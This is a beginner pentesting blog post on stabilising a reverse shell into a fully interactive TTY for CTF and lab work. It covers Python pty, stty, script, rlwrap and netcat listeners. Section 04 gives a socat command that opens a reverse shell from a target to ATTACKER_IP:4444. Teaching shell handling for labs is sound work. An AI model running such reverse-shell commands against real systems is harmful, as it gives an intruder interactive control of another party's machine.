---
layout: post
title: "From Basic Shell to Fully Interactive TTY | Linux Notes"
date: 2026-11-23
platform: notes
level: beginner
points: 0
author: "othmane01"
tags:
  - linux
  - reverse-shell
  - tty
  - shell-stabilization
  - python
  - netcat
  - socat
  - pty
  - pentesting
  - privilege-escalation
  - tryhackme
  - hack-the-box
  - ctf
  - cybersecurity
---

![Image]({{ site.baseurl }}/images/notes/tty/1.png)

You finally get a reverse shell. Nice!

You run `whoami`, check `id`, and start enumerating. Then you try pressing `TAB`... nothing.

You press `Ctrl + C`... and accidentally kill your entire shell.

You try running `sudo -l`... and it complains about the terminal.

Welcome to the wonderful world of **basic reverse shells**.

A shell is useful, but an interactive shell is much better. Let's fix that.

## First, what's the problem?

A basic Netcat reverse shell usually gives you a limited shell without a proper terminal.

You might run into problems like:

- No command history.
- No TAB autocompletion.
- Broken `Ctrl + C` behavior.
- Interactive programs like `nano`, `vim`, or `su` refusing to work.
- Weird screen behavior and terminal resizing issues.

What we want is a proper **TTY (Teletypewriter)**.

A TTY provides a terminal interface that allows programs to interact with your shell properly.

Let's upgrade it.

---

## 01. The classic: Python PTY

**Difficulty: Easy | My usual first choice**

If Python is installed on the target, this is probably the quickest way to improve your shell.

Run this inside your reverse shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

No Python 3? Try:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

What's happening here?

- `pty` is Python's pseudo-terminal module.
- `pty.spawn()` launches a program inside a new pseudo-terminal.
- `/bin/bash` starts Bash inside that terminal.

Your shell is now better, but there's still one more step.

### The final touch: configure your terminal

**Step 1.** Press `Ctrl + Z` to suspend the reverse shell and return to your local terminal.

**Step 2.** Put your local terminal into raw mode:

```bash
stty raw -echo
```

This changes how your local terminal handles input and disables local echo.

**Step 3.** Bring the reverse shell back:

```bash
fg
```

Press Enter if necessary.

**Step 4.** Set the terminal type inside the remote shell:

```bash
export TERM=xterm-256color
```

**Step 5.** Fix the terminal dimensions.

Before suspending your shell, you can check your local terminal dimensions with:

```bash
stty size
```

Example output:

```text
40 120
```

That means 40 rows and 120 columns.

Apply those dimensions inside the remote shell:

```bash
stty rows 40 columns 120
```

**Done! Your shell should now be much more comfortable to use.**

**Small but important tip:** If you exit the reverse shell and your local terminal looks broken, restore it:

```bash
stty sane
```

---

## 02. No Python? Try `script`

Not every target has Python installed. Annoying, but that's penetration testing.

Another option is the Linux `script` utility.

Try:

```bash
script -qc /bin/bash /dev/null
```

This launches Bash through a pseudo-terminal.

Check whether the utility exists first:

```bash
which script
```

Its availability and behavior depend on the target system.

---

## 03. Make Netcat less painful with rlwrap

Sometimes the problem isn't only the remote shell. Your local Netcat session could use some improvements too.

That's where `rlwrap` comes in.

Start your listener like this:

```bash
rlwrap nc -lvnp 4444
```

What does it give you?

- Command history.
- Better command-line editing.
- Easier navigation through previous commands.

**Important:** `rlwrap` improves local interaction with Netcat. It does not create a remote TTY or fully stabilize the shell by itself.

---

## 04. Want something better? Meet Socat

If Socat is available on both machines, it can provide a much cleaner interactive reverse shell.

**On your attacking machine**, start the listener:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On the target machine**, connect back:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

Replace `ATTACKER_IP` with your attacking machine's IP address.

Socat handles the PTY allocation and terminal setup for you.

It's a good alternative when Python isn't available or you want a more complete interactive shell.

---

## 05. Quick cheat sheet

Because nobody wants to scroll through an entire writeup just to find one command.

| Tool / Command | What it does |
|---|---|
| `pty.spawn()` | Spawns a shell inside a pseudo-terminal |
| `stty raw -echo` | Configures local terminal input |
| `fg` | Resumes the suspended reverse shell |
| `export TERM=xterm-256color` | Sets terminal capabilities |
| `stty rows/columns` | Fixes terminal dimensions |
| `script` | Runs a command through a PTY |
| `rlwrap` | Adds command history and editing |
| `socat` | Provides a more complete interactive shell |

---

## 06. My usual workflow

When I get a basic reverse shell during a CTF, I usually start with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press:

```text
CTRL + Z
```

Back on my local terminal:

```bash
stty raw -echo
fg
```

Finally, inside the remote shell:

```bash
export TERM=xterm-256color
```

That's usually enough to make the shell much more usable.

If Python isn't available, I start looking for alternatives such as `script` or Socat.

---

## Final thoughts

Getting a reverse shell is one thing. Being able to work comfortably with it is another.

A properly configured TTY makes enumeration, privilege escalation, and interacting with Linux utilities much easier.

It's a small step, but one you'll use constantly in HTB, TryHackMe, and real penetration testing engagements.

**Remember: don't just get a shell. Make it usable.**